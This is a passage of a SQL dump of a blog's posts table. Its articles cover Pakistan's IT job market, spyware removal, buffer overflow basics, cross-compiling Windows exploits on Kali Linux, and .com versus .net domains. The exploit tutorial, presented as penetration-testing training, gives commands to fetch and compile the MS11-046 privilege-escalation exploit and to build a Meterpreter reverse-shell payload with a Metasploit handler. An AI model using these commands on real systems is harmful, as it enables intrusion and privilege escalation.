classroom or in the online sphere.</p>\n\n<p>One might be led to believe that a university education plays a very significant role in helping someone land a job at a decent company, but as it happens, that is not quite the case.</p>\n\n<p>As per the survey, only 21 percent of companies reported giving preference to Pakistani university graduates, while 11 percent favor those having international certifications. Interestingly, only a mere 9 percent of companies favor candidates with higher education or credentials from foreign institutions.</p>\n\n<p>While these statistics are bound to raise eyebrows, it is worth pointing out that graduates of leading local universities continue to lead in terms of employee headcount.</p>\n\n<p>Lahore and Islamabad acquire the most programming talent from COMSATS, followed Bahria University and FAST-NUCES. Meanwhile, Karachi-based companies regard the University of Karachi and NED as their biggest pools of talent.</p>\n\n<h2><strong>The future</strong></h2>\n\n<p>The IT industry in Pakistan, for all intents and purposes, is booming. Granted, there are still areas which could use some major improvement, especially gender diversity.</p>\n\n<p>Tech companies in general have a reputation for being dominated by men, and when one considers the national diversity ratio of 17.08 percent, it is clear that Pakistan has some serious catching up to do in this regard. The survey suggested that 65 percent of companies have a male-female ratio of less than 20 percent and only 6 percent of companies can boast a 40 percent female staff.</p>\n\n<p>Having said that, data like this is incredibly meaningful in terms of getting a clearer idea of where a particular industry stands and where it is headed. For Pakistan, the upward progress is encouraging, but with special focus on making the tech sphere more inclusive, it could certainly go even further.</p>', '163239583311512594484_6ab7131cc8_b1.jpg', 38, 'Published'),
(14, 'How to avoid and remove spyware', 'how-to-avoid-and-remove-spyware', 'akram123', '2021-09-23 16:19:13', '<p>As technological trends continue to make impactful changes, misuse of these technologies has increased. Many hacker groups utilize different software tools to fetch information for personal profit and gain. Chances are even that fun game you installed on your phone might be sending your personal data to the owner without your consent.</p>\n\n<h2>How spyware works</h2>\n\n<p>In a nutshell, spyware is primarily software that resides on a device and sends data to the creator of the software. The data it fetches from your device varies, it may be surfing habits, system details, login information, or even data regarding your online banking methods. These spyware softwares can be in any form such as ads that pop up on your computer when you are searching for something or when you download a harmless productivity app or game. Once you download or open these so-called harmless apps and ads they provide you with what you think you need but also start gathering information about you from the backend and most probably sell it for profit.</p>\n\n<p>We always think how the top-rated apps in the Google Play Store and Apple&rsquo;s App Store are free and easily accessible but the reality is that you may not be paying with money but you certainly are paying for what you use with your data.</p>\n\n<h2>The effects of spyware</h2>\n\n<p>If you have a suspiciously friendly-looking app on your phone or some neat add-on for your browser, then it&rsquo;s most probably spyware. However, the effects of spyware aren&rsquo;t just collecting data as it also sends spam e-mail to you and your contacts. In addition, everything you search on the web might be traced. The worst-case scenario is when hackers download your images or try to access your banking details.</p>\n\n<p>There have been many cases where people have gone bankrupt by just clicking one advertisement on the internet. Based on previous records of spyware, hacker groups even got someone nearly to jail by utilizing a user&rsquo;s personal computer to break the law.</p>\n\n<h2>Avoiding spyware</h2>\n\n<p>Although ads and &lsquo;so-called friendly apps will keep popping up every now and then so hence there is very little chance that one could completely eradicate spyware from the world but you can always avoid it. Here are a few steps you can take to prevent spyware from mucking up your device:</p>\n\n<ul>\n	<li>Keep your Windows and Mac OS up to do date and ensure you install the latest security patches. Such patches are specifically designed to prevent spyware in the first place.</li>\n	<li>Install verified anti-virus softwares from reliable sources and ensure that they are constantly updated.&nbsp;The most popular brands include Norton, Microsoft Defender, McAfee, Spybot, Search &amp; Destroy, Pest Control, and Grisoft.</li>\n	<li>Do not download shareware or any application from an unknown source. Always check that the site connection is secure or not before proceeding.</li>\n	<li>After you download a software, be sure to read the terms and conditions before heading on to install the software.</li>\n	<li>Do not click on pop-up ads even if the ad shows the name of a popular brand. If you mistakenly open an add quickly close the tab. Moreover, if something you see is being downloaded after clicking the ad, make sure to cancel the download.</li>\n	<li>Try to install a firewall especially if you use a home network or if you have your own servers. This allows you further protection from hackers.</li>\n	<li>If you see a tab that pops up and says &lsquo;A virus has been detected.&rsquo; do not take any action and simply close the tab.</li>\n	<li>Never open e-mail attachments from unreliable sources.</li>\n</ul>\n\n<h2>Removing spyware</h2>\n\n<p>Let&rsquo;s say you have spyware in your computer or any other device, here are several steps you can take to remove the spyware:</p>\n\n<ul>\n	<li>Disconnect your device from the internet and run a comprehensive scan on your device using your anti-virus software.</li>\n	<li>Once detected check the location of the spyware and delete all respective files.</li>\n	<li>If nothing else works, format your hard drive and reinstall your OS and copy your data to your drive. In addition, eliminate unused applications and data.</li>\n</ul>\n\n<p>Let us know in the comments which steps worked for you.</p>', '1633183226.jpeg', 3, 'Published'),
(15, 'Buffer overflow explained The basics', 'buffer-overflow-explained-the-basics', 'habib123', '2021-09-23 16:40:59', '<p>One of the most common and oldest security vulnerabilities in software are buffer overflow vulnerabilities. Buffer overflow vulnerabilities occur in all kinds of software from operating systems to client/server applications and desktop software. This often happens due to bad programming and the lack of or poor input validation on the application side. In this article we will look at what a buffer overflow exactly is, how they work and how they can become serious security vulnerabilities. We will also look at what happens when a buffer overrun occurs and mitigation techniques to minimize their harmful effects.</p>\n\n<h2>What is a buffer overflow?</h2>\n\n<p>A buffer overflow is a situation where a running program attempts to write data outside the memory buffer which is not intended to store this data. When this happens we are&nbsp;talking about&nbsp;a buffer overflow or buffer overrun situation. A memory buffer is an area in the computer&rsquo;s memory (RAM) meant for temporarily storing data. This kind of buffers can be found in all programs and&nbsp;are used to store data for input, output and processing.</p>\n\n<p>An example of data stored in buffers are login credentials or the hostname for an FTP server. Also other data temporarily stored before processing can be stored in buffers. This literally could be anything from user input fields such as username and password fields to input files used to import certain configuration files.&nbsp;When the amount of&nbsp;data written to the buffer exceeds the expected amount of data, the memory buffer is overrun. This happens for example when a username with a maximum of 8 bytes is expected and a username of 10 bytes is given and written to the buffer. In this case the buffer is exceeded by 2 bytes and an overflow will occur when it&rsquo;s not prevented from happening. This often happens due to bad programming and the lack of input sanitization.</p>\n\n<p><img alt=\"buffer overflow example\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/12/buffer-overflow-example.jpg\" style=\"height:231px; width:576px\" /></p>\n\n<p>An example of a buffer overflow when writing 10 bytes of data (username12) to an 8 byte buffer.</p>\n\n<h2>What happens when a buffer overflow occurs?</h2>\n\n<p>When a memory buffer overflow occurs and data is written outside the buffer, the running program may become unstable, crash or return corrupt information. The overwritten parts of memory may have contained other important data for the running application which is now overwritten and not available to the program anymore. Buffer overflows can even run other (malicious) programs or commands and result in arbitrary code execution.</p>\n\n<h3>Arbitrary code execution and privilege escalation</h3>\n\n<p>When a buffer overflow vulnerability is used to write malicious data in the memory and the attacker is able to take control of the execution flow of a program, we are dealing with a serious security vulnerability. Buffer overflows can then become serious security issues. These security&nbsp;issues&nbsp;can be exploited by&nbsp;hackers&nbsp;to take (remote) control of a host, perform privilege escalation or a lot more bad things as a&nbsp;result of arbitrary code execution. Arbitrary code execution is the process of injecting code in the buffer and get it to execute.</p>\n\n<p>Privilege escalation is performed through exploiting a buffer overflow vulnerability to execute arbitrary code in a program that is running with system privileges. The executed code can be shellcode which gives the attacker an OS shell with administrative privileges for example, or even add a new (administrator) user to the system. Also with buffer overflows the executed code happens in the context of the running application. This means that when the exploited&nbsp;application runs under with administrative privileges, the malicious code will also be executed with administrative privileges.</p>\n\n<h3>Denial of Service (DoS)</h3>\n\n<p>Not all buffer overflow vulnerabilities can be exploited to gain arbitrary code execution. Also (remote) Denial of Service attacks can be performed when they only crash the running program. As buffer overflows vulnerabilities can occur in any software&nbsp;DoS attacks&nbsp;are not just limited to services and computers. Also routers, firewalls IoT devices and anything else running an OS can be targeted. An example of this situation is the recent Cisco ASA IKEv1 and IKEv2 Buffer Overflow exploits lately. Some of these remote exploits only crash and force reboot the firewall&nbsp;resulting in a&nbsp;couple minutes downtime.</p>\n\n<h2>How to prevent buffer overflows from occurring?</h2>\n\n<p>Buffer overflows in software can be prevented or mitigated in several ways. Mitigation is the process of minimizing the impact of a threat before or after the threat occurs. This is exactly what we need to do when it comes to buffer overflows. They can be prevented from happening before they occur (proactive). But, since buffer overflows keep occurring, despite the proactively taken actions to avoid them, we also need mechanisms in place to minimize impact when they do occur (reactive countermeasures). Let&rsquo;s have a look at how buffer overflow prevention and mitigation works.</p>\n\n<h3>Buffer overflow prevention</h3>\n\n<p>The best and most effective solution is to prevent buffer overflow conditions from happening in the code. For example when a maximum of 8 bytes as input data is expected, than the amount of data which can be written to the buffer to be limited to 8 bytes at any time. Also, programmers should be using save functions, test code and fix bugs accordingly.&nbsp;Proactive methods for buffer overflow prevention like these should be used whenever possible to limit buffer overflow vulnerabilities.</p>\n\n<p><a href=\"https://www.virtualhackinglabs.com/?utm_source=ht&amp;utm_medium=postbanner&amp;utm_campaign=ht\" target=\"new\"><img alt=\"Virtual Hacking Labs - Penetration testing lab\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2020/02/VHL-Banner-2.jpg\" /></a></p>\n\n<h3>Buffer overflow mitigation</h3>\n\n<p>Another way of safeguarding to buffer overflows is to detect them as they happen and mitigate the situation. This is an reactive approach and focuses on minimizing the harmful impact. An example of effective mitigation is a modern operating system which protects certain memory areas from being written to or executed from. This will prevent an attacker from writing arbitrary code to the memory when a buffer overflow occurred. Implementations like DEP, ASLR, SEHOP and executable space and pointer protection try to minimize the negative impact of a buffer overflow. This does not prevent the buffer overflow from occurring, but it does minimize the impact.</p>\n\n<p>Another way of passive buffer overflow detection&nbsp;is using intrusion detection systems (IDS)&nbsp;to analyse network traffic.&nbsp;An IDS is capable of&nbsp;detecting signatures in network traffic which are&nbsp;known to exploit&nbsp;buffer overflow vulnerabilities. The IDS can than mitigate the attack and&nbsp;prevent the payload from executing on the targeted system.</p>\n\n<h2>How does a buffer overflow work and look like in code?</h2>\n\n<p>Let&rsquo;s have a look at how a buffer overflow actually works by looking at the program code. We explain this process using a very known function vulnerable to buffer overflow is the strcopy() function in the c library. This functions uses 2 pointers as parameters, the source which points to the source array to copy from and the destination pointer to the character array to write to. When the function is executed the source array of chars will be copied to the destination array and does not have a check for bounds when it does so. When the source buffer is larger than the destination buffer, than the buffer is overrun.</p>\n\n<h3>Buffer overflow with strcpy()</h3>\n\n<p>The follow image is an example of the strcpy() function using a source which is overrunning the destination buffer.</p>\n\n<p><img alt=\"buffer overflow strcpy example\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/12/buffer-overflow-strcpy-example.jpg\" style=\"height:407px; width:576px\" /></p>\n\n<p>The code would look like the following image in you IDE of choice:</p>\n\n<p><img alt=\"buffer overflow strcpy code\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/12/buffer-overflow-strcpy-code.jpg\" style=\"height:184px; width:514px\" /></p>\n\n<p>In this example the buffer is overrun with 2 bytes containing a harmless 1 and 2. Since the strcpy() function does not perform a bounds check we could write anything outside the buffer space. Also malicious code like shellcode. In the following tutorials about buffer overflows&nbsp;we will learn about overrunning buffers with shellcode instead of 1&rsquo;s and 2&rsquo;s. We will also learn how to control the execution flow of a program and execute the malicious shellcode outside the buffer.</p>\n\n<h2>Lessons learned</h2>\n\n<p>We have learned that a buffer overflow is caused by certain conditions where a running program is writing data outside the memory buffer. By injecting (shell)code and redirecting the execution flow of a running program to that code, an attacker is able to execute that code. This is called arbitrary code execution. With arbitrary code execution an attacker is able to gain (remote) control of a specific target, elevate privileges or cause a denial of service on the target.</p>\n\n<p>Buffer overflows can be proactively prevented and mitigated with several techniques. Programmers should write secure code and test it for buffer overflows. When a buffer overflow is not prevented from happening it can still be mitigated with reactive methods like protecting memory from being written to.</p>\n\n<p>We have tried to explain buffer overflow basics without to many technical details. In the following tutorials about this subject we will get into more details regarding stack based buffer&nbsp;overflows, heap based buffer&nbsp;overflows and how to detect and exploit buffer overflows vulnerabilities in software. We will also be learning about shellcode and writing our own basic buffer overflow exploits.</p>', '1633183172.jpg', 1, 'Published');
INSERT INTO `posts` (`id`, `title`, `slug`, `author`, `date`, `content`, `thumbnail`, `view_count`, `status`) VALUES
(16, 'How to compile Windows exploits on Kali Linux', 'how-to-compile-windows-exploits-on-kali-linux', 'habib123', '2021-09-23 16:43:32', '<p>Microsoft Windows still holds the largest market share when it comes to operating systems for desktop computers, both for enterprise use and personal use. Therefore it is highly likely you will encounter a lot of Windows workstations and servers during your penetration testing training and career. On the other hand, most penetration testers mainly use Linux based distributions such as Kali Linux, Pentoo or Backbox. Therefor you need the ability to quickly compile Windows exploits on your Linux machine. The solution for this is: Mingw-w64.</p>\n\n<p>Mingw-w64 is a free and open source software development environment for creating Windows applications. Mingw-w64 was originally called Mingw32 which didn&rsquo;t support the 64 bit architecture. In this tutorial we will be looking at how to use Mingw-64 to compile exploits for Windows on Kali Linux. Let&rsquo;s start with installing Mingw-w64 on Kali Linux.</p>\n\n<h2>Installing Mingw-w64 on Kali Linux</h2>\n\n<p>Mingw-w64 is not installed by default on Kali Linux 2016.2 and earlier version. Therefore we need to install it first before we can compile Windows exploits on Linux. Run the following commands to install Mingw-w64:</p>\n\n<blockquote>\n<p>apt-get update</p>\n\n<p>apt-get install mingw-w64</p>\n</blockquote>\n\n<p><img alt=\"installing-mingw-w64\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/Installing-Mingw64.jpg\" style=\"height:574px; width:804px\" /></p>\n\n<p>Use apt-get install mingw-w64 to install Mingw-w64 on your Kali host.</p>\n\n<p>Type y for yes to confirm and continue the Mingw-w64 installation process. Downloading and installing Mingw-w64 may take a little while to complete.</p>\n\n<h3>Unable to locate package mingw-w64</h3>\n\n<p>Sometimes you get a Unable to locate package mingw-w64 error when trying to install the mingw-w64 package and get something like:</p>\n\n<blockquote>\n<p>root@kali:~# apt-get install mingw-w64</p>\n\n<p>Reading package lists&hellip; Done</p>\n\n<p>Building dependency tree</p>\n\n<p>Reading state information&hellip; Done</p>\n\n<p>E: Unable to locate package mingw-w64</p>\n</blockquote>\n\n<p>To solve this issue make sure you have the right repositories in the sources.list file. You can edit the file using nano:</p>\n\n<blockquote>\n<p>/etc/apt/sources.list</p>\n</blockquote>\n\n<p>Make sure you have the correct repositories in this file. You can find the repositories for different versions of Kali Linux on the following page:</p>\n\n<p><a href=\"https://docs.kali.org/general-use/kali-linux-sources-list-repositories\">https://docs.kali.org/general-use/kali-linux-sources-list-repositories</a></p>\n\n<p>With the right repositories in the sources.list file you need to run apt-get update and then run the installation command for the Mingw-w64 package again.</p>\n\n<h2>Cross compiling Windows exploits with Mingw-w64</h2>\n\n<p>Now that we have Mingw-w64 installed we can start to compile Windows exploits on Kali Linux. For this tutorial we will be compiling a Windows exploit written in c to exploit CVE-2011-1249 (MS11-046) vulnerability in Windows 7 SP0 x86. This version of the Windows operating system contains a vulnerability in the Ancillary Function Driver (AFD) which allows an elevation of privilege for an authenticated non administrative user. Even though Mingw-w64 was developed for the much needed 64 bit support we can also compile 32 bit Windows exploits. Let&rsquo;s have a look at how we can compile 32 bit Windows exploits.</p>\n\n<p>Let&rsquo;s start with downloading the exploit from Exploit-db:</p>\n\n<blockquote>\n<p>wget output-document= 40564.c https://www.exploit-db.com/download/40564</p>\n</blockquote>\n\n<p>Use the following command to compile the afd.sys exploit for Windows 32 bit:</p>\n\n<blockquote>\n<p>i686-w64-mingw32-gcc [input file: source]&ndash;o [output file: .exe]&ndash;lws2_32</p>\n</blockquote>\n\n<p>The following command will compile the Windows 7 afd.sys privilege escalation exploit:</p>\n\n<blockquote>\n<p>i686-w64-mingw32-gcc 40564.c &ndash;o exploit.exe &ndash;lws2_32</p>\n</blockquote>\n\n<p><img alt=\"Compile Windows x64 exploit with Mingw-w64\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/Compile-Windows-x64-exploit-with-Mingw64.jpg\" style=\"height:76px; width:787px\" /></p>\n\n<p>Compile the Windows exploit.</p>\n\n<p>To transfer the exploit to the target host we will be serving it with the build-in Apache webserver. The last 2 commands will copy exploit to the Apache home directory and start the Apache webserver.</p>\n\n<p>When we download and execute the exploit from cmd.exe it will look like this:</p>\n\n<p><img alt=\"Windows exploit results\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/Windows-exploit-results.jpg\" style=\"height:552px; width:516px\" /></p>\n\n<p>The exploit executed successfully.</p>\n\n<p>As we can see the whoami command returns a privileged user before executing the exploit and system user after. This exploit actually spawns a new shell in the current shell where it was launched from instead of a new shell in a new window. This means we can also run this exploit from command line shell, such as Meterpreter. Let&rsquo;s see how we can run the exploit from a Meterpreter session.</p>\n\n<h2>Exploit compilation errors</h2>\n\n<p>When compiling exploits for different architectures and operating systems many errors can occur. There are a lot of variables which can cause the compilation to fail, such as: syntax, libraries, host and target architectures, installed software used for compiling code and a lot more. Some errors may be easy to fix and some are not. It is also important to distinct warnings from fatal errors since warnings may just indicate something like deprecated functions which do not prevent the exploit from working. Fatal errors do prevent the exploit from working and therefor need to be fixed.</p>\n\n<p>The best way to deal with compilation errors is to read them carefully and then search Google for solutions. Often you&rsquo;re not the first and only person facing a certain compilation error and therefore it is not necessary to reinvent the wheel. Online resources such as stack exchange often provide you with possible solutions for the most common compilation errors.</p>\n\n<h2>Exploit MS11-046 from a Meterpreter shell</h2>\n\n<p>Let&rsquo;s quickly generate a Windows 32-bit Meterpreter reverse TCP payload using Msfvenom and execute it on the target host. We will be using the multi handler in Metasploit to catch the reverse shell.</p>\n\n<p>Use the following command to create the payload using Msfvenom:</p>\n\n<blockquote>\n<p>msfvenom -a x86 &ndash;platform Windows -p windows/meterpreter/reverse_tcp LHOST=[IP attackbox] LPORT=4444 -e x86/shikata_ga_nai &ndash;f exe &ndash;o exploit.exe</p>\n</blockquote>\n\n<p>Be sure to replace the listening host IP and if necessary the listening port. Now start msfconsole and run the following commands to set up the multi handler exploit:</p>\n\n<blockquote>\n<p>use exploit/multi/handler</p>\n\n<p>set lhost [listening host IP]</p>\n\n<p>set lport 4444</p>\n\n<p>run</p>\n</blockquote>\n\n<p><img alt=\"MSF multi handler\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/MSF-multi-handler.jpg\" style=\"height:98px; width:492px\" /></p>\n\n<p>Start the reverse TCP handler on port 4444.</p>\n\n<p>Than download the exploit to the target host and execute it. If everything was setup correctly you should receive a reverse Meterpreter shell on the msfconsole:</p>\n\n<p><img alt=\"MSF multi handler reverse shell\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/MSF-multi-handler-reverse-shell.jpg\" style=\"height:169px; width:786px\" /></p>\n\n<p>The target host connects back to the Kali box.</p>\n\n<p>Next type shell on the Meterpreter command line and run the privilege escalation exploit to escalate the shell to a system shell:</p>\n\n<p><img alt=\"Windows 7 privilege escalation exploit\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/Windows-7-privilege-escalation-exploit.jpg\" style=\"height:292px; width:591px\" /></p>\n\n<p>The privilege escalation exploit executed successfully through our Meterpreter sessions.</p>\n\n<p>As you can see the shell goes from the privileged test user shell to a system shell. Please note that a new system shell is spawned in the shell where it was executed from. Therefor we cannot see the exploit output as it is in the old shell with limited privileges.</p>\n\n<p>You can verify this by typing Exit which will exit the system shell and return you to the user shell which still contains the Windows 7 privilege escalation exploit output:</p>\n\n<p><img alt=\"Windows 7 privilege escalation exploit results\" src=\"https://www.hackingtutorials.org/wp-content/uploads/2016/11/Windows-7-privilege-escalation-exploit-results.jpg\" style=\"height:478px; width:321px\" /></p>\n\n<p>The exploit output on the privileged user shell.</p>\n\n<h2>&nbsp;</h2>\n\n<h2>Lessons learned</h2>\n\n<p>In this tutorial we have learned the basics of cross compiling exploits for Windows on Linux. We have learned how to install Mingw-w64 on Kali Linux and solve the most common installation problems. To practice the exploit compilation process we have compiled a privilege escalation exploit targeted for Windows 7 x86. This is also called cross compiling.</p>\n\n<p>We have successfully executed the&nbsp;compiled executable on the target host and escalated the shell from a limited user shell to a system shell. We have learned that this particular exploit spawned a shell inside the shell where the exploit was executed from. This way we can also execute the privilege escalation exploit from a command line such as a Meterpreter shell. Last but not least we have learned about how to fix errors during the compilation process. As an ethical hacker and penetration tester it is advised to consult resources like stack exchange to search for solutions for compilation errors.</p>', '1633183144.jpg', 2, 'Published'),
(18, 'Com vs Net What is the Difference Between Domain Extensions', 'com-vs-net-what-is-the-difference-between-domain-extensions', 'habib123', '2021-09-23 17:02:16', '<p>Have you ever wondered what the difference is between .com vs .net domain name extensions? Choosing the right domain name is crucial because it can have an impact on your branding and search rankings.</p>\n\n<p>In this article, we will explain the difference between .com vs .net domain extensions and which one is better for your website.</p>\n\n<p>What Are .Com and .Net Domain Name Extensions?</p>\n\n<p>A domain name is your website&rsquo;s address on the internet. Ours is&nbsp;<em>wpbeginner.com</em>.</p>\n\n<p>To learn more about domain names, see our beginner&rsquo;s guide on&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/beginners-guide-what-is-a-domain-name-and-how-do-domains-work/\">what is a domain name and how do domains work</a>.</p>\n\n<p>Domain names always have an extension. This is sometimes also called a TLD, which stands for Top Level Domain. For instance:</p>\n\n<p>example<strong>.com</strong><br />\nexample<strong>.net</strong><br />\nexample<strong>.org</strong></p>\n\n<p>You can choose from a wide range of domain extensions when&nbsp;<a href=\"https://www.wpbeginner.com/guides/\">making your website</a>.</p>\n\n<p>Most domain extensions don&rsquo;t have any restrictions on usage and lots of&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/should-you-choose-a-new-domain-extension-for-your-website/\">new domain extensions</a>&nbsp;have been created in recent years.</p>\n\n<p>However, extensions were originally created for different types of websites. They have specific meanings.</p>\n\n<p>You need to choose a domain name extension that fits your business while helping you build a recognizable brand in your industry.</p>\n\n<p>Let&rsquo;s take a look at the difference between the most popular .com vs .net domain extensions to see which is better for your business.</p>\n\n<p>Difference Between .Com vs .Net Domain Names</p>\n\n<p><img alt=\"The .com vs .net domain extension\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/com-vs-net-domain-extension.png\" style=\"height:320px; width:550px\" /></p>\n\n<p>Com and Net are two of the most popular domain name extensions. If your preferred .com domain name extension is not available, then you might be tempted to use a .net instead.</p>\n\n<p>However, .net isn&rsquo;t a good option for your business in most cases.</p>\n\n<p>The &ldquo;com&rdquo; in the .com domain name indicates a &ldquo;commercial&rdquo; site. This can cover business websites, websites that want to&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/make-money-online/\">make money online</a>, personal websites, blogs, portfolios, and more.</p>\n\n<p>On the other hand, the &ldquo;net&rdquo; in the .net domain name extension stands for &ldquo;network&rdquo;. It was designed for the internet, networking, and email service providers.</p>\n\n<p>If you&rsquo;re wondering about .org, that stands for &ldquo;organization&rdquo; and was originally intended for use by&nbsp;<a href=\"https://www.wpbeginner.com/showcase/best-wordpress-themes-for-nonprofits/\">nonprofit organizations</a>.</p>\n\n<p>When Should You Choose a .Com Domain Name?</p>\n\n<p><img alt=\"The extension .com on a bulletin board\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/dot-com-extension.jpg\" style=\"height:273px; width:550px\" /></p>\n\n<p>The .com domain extension has been synonymous with the internet since the &ldquo;dot-com bubble&rdquo; in the late 1990s. Over 40% of all registered domain names are .com domains.</p>\n\n<p>It&rsquo;s much easier for people to remember a .com domain name than any other domain extension. It&rsquo;s familiar and reassuring, plus it makes your site look professional.</p>\n\n<p>Also, most mobile keyboards have a dedicated .com button. You won&rsquo;t find that for .net (or any other extension).</p>\n\n<p>There&rsquo;s just one problem. You&rsquo;ve probably noticed that .com domain names are so popular that it feels like all the good ones are already taken!</p>\n\n<p>However, there are still plenty of clever ways to get the perfect .com domain name. Here are some things to try:</p>\n\n<ul>\n	<li>Check that your domain name represents your business and what you do. For example, stargardeningservices.com is better than starservices.com.</li>\n	<li>If your preferred domain name is taken, then you can add a word before or after it to make it unique. Your location could work well here. For example, stargardeninghouston.com.</li>\n	<li>Make sure your domain name can be easily pronounced and remembered. Don&rsquo;t use hyphens or numbers in your domain name.</li>\n	<li>Take advantage of&nbsp;<a href=\"https://www.wpbeginner.com/showcase/14-best-free-domain-name-generators-on-the-internet/\">online domain name generators</a>. These free tools will help you come up with clever domain name ideas that are unique and still available. WPBeginner now has an AI-powered&nbsp;<a href=\"https://www.wpbeginner.com/tools/business-name-generator/\">free business name generator</a>.</li>\n</ul>\n\n<p>Need more help? We&rsquo;ve got lots of practical tips and real-life examples in our article on how to&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/tips-and-tools-to-pick-the-best-domain-for-your-blog/\">choose the best domain name</a>&nbsp;for your website.</p>\n\n<p>When You Should Use the .Net Domain Extension?</p>\n\n<p>The .net extension still makes sense in some cases. You could use it if you offer internet, networking, database hosting, email hosting, or similar services.</p>\n\n<p>You might even want to use a .net domain name if it truly suits your brand.</p>\n\n<p>For example, Behance.net is a popular online design community which uses a .net domain extension for their website. It suits them because they wanted to be a network of artists, designers, and companies looking for talent.</p>\n\n<p>Under 4% of all domain names registered are using the .net domain extension.</p>\n\n<p>Why You Might Be Tempted to Use the .Net Extension</p>\n\n<p>Have you ever tried to register a .com domain and seen something like this?</p>\n\n<p><img alt=\"The .net domain is being promoted as an alternative to the .com one\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/search-domain-name-net-promoted.png\" style=\"height:269px; width:550px\" /></p>\n\n<p>Domain name registrars often present .net as the top alternative to .com. This might make you think it&rsquo;s more commonly used than it actually is.</p>\n\n<p>Even the most well-known internet and network service companies use a .com domain name for their business.</p>\n\n<p>Of course, 4% is still a lot of domain names. Over 13 million, in fact. You might wonder who&rsquo;s using all those .net domain names.</p>\n\n<p>In many cases, the .net domains aren&rsquo;t really being used.</p>\n\n<p>Many businesses register a .net extension so no-one else can take it. They may not use the .net domain, or they may redirect it to their .com. site.</p>\n\n<p>Also, some companies started with a .net because they couldn&rsquo;t get the .com they wanted. Most later transferred to a .com domain extension, often keeping the .net domain name registered for technical and legal reasons.</p>\n\n<p>Choosing .Com vs .Net &ndash; Which One is Better for SEO?</p>\n\n<p><img alt=\"SEO - search engine optimization - in letters\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/seo-search-engine-optimization.jpg\" style=\"height:327px; width:550px\" /></p>\n\n<p>A lot of our users ask us which domain extension will help them rank higher.</p>\n\n<p>If you&rsquo;re looking at either .com or .net, it doesn&rsquo;t make any difference which you choose from an SEO perspective. Search engines will treat both domain extensions the same.</p>\n\n<p>Just focus on&nbsp;<a href=\"https://www.wpbeginner.com/wordpress-seo/\">SEO best practices</a>&nbsp;and create useful targeted content to rank higher.</p>\n\n<p>The important part is your domain name itself, not the extension.</p>\n\n<p>For example,&nbsp;<em>stargardeningservices.com</em>&nbsp;will rank better than&nbsp;<em>starservices.net</em>&nbsp;because it contains a keyword (gardening services) that people are likely to search for.</p>\n\n<p>How to Buy a Domain Name</p>\n\n<p>There are two ways to get a domain name. You can choose the one that best suits you.</p>\n\n<p><strong>1. Get a FREE Domain Name with Bluehost</strong></p>\n\n<p>To make a website, you need website hosting as well as a domain name.</p>\n\n<p>This may seem a bit confusing when you&rsquo;re new to creating websites. Make sure you&rsquo;re clear on the&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/whats-the-difference-between-domain-name-and-web-hosting-explained/\">difference between domain name and website hosting</a>.</p>\n\n<p>Usually, you will pay around $14.99/year for a domain name and $7.99/month for hosting. If you are just starting out, then you may feel that&rsquo;s quite expensive.</p>\n\n<p>Luckily, the folks at&nbsp;<a href=\"https://www.wpbeginner.com/refer/bluehost/\" target=\"_blank\">Bluehost</a>&nbsp;are offering WPBeginner users a free domain name and a 65% discount on hosting.</p>\n\n<p><a href=\"https://www.wpbeginner.com/refer/bluehost/\" target=\"_blank\">&rarr; Click Here to Claim Your Free Domain Name &larr;</a></p>\n\n<p><strong>2. Register a Domain Name</strong></p>\n\n<p>If you don&rsquo;t want to make a website straight away, you can still register a domain name and make a website later.</p>\n\n<p>We recommend using&nbsp;<a href=\"https://www.wpbeginner.com/refer/domain-com/\" target=\"_blank\">Domain.com</a>&nbsp;for this. They offer features like private registration, easy transfers, easy DNS management, and more. Their search tool shows you&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/how-much-does-a-domain-name-really-cost-expert-answer/#premium-domain-cost\">premium domains</a>&nbsp;as well as regular ones, too.</p>\n\n<p><img alt=\"Registering a domain name with Domain.com\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/domain-dot-com-registration-min.jpg\" style=\"height:350px; width:550px\" /></p>\n\n<p>To get an exclusive 25% discount on your domain, make sure you go through our link to&nbsp;<a href=\"https://www.wpbeginner.com/refer/domain-com/\" target=\"_blank\">Domain.com</a>. This will automatically apply our&nbsp;<a href=\"https://www.wpbeginner.com/deals/domain-com-coupon/\">Domain.com coupon code</a>.</p>\n\n<p>If you&rsquo;re looking for Domain.com alternatives, then please see our list of the&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/how-to-choose-the-best-domain-registrar/\">best domain registrars</a>.</p>\n\n<p>If this is your first time registering a domain name, then you may want to use our step by step guide on&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/how-to-register-a-domain-name-simple-tip-to-get-it-for-free/\">how to register a domain name</a>.</p>\n\n<p>We hope this article helped you learn the difference between .com vs .net domain name extensions. You may also want to see our step by step guides on&nbsp;<a href=\"https://www.wpbeginner.com/start-a-wordpress-blog/\">how to start a blog</a>&nbsp;and&nbsp;<a href=\"https://www.wpbeginner.com/wp-tutorials/how-to-start-an-online-store/\">how to start an online store</a>.</p>', '1633183100.png', 2, 'Published'),
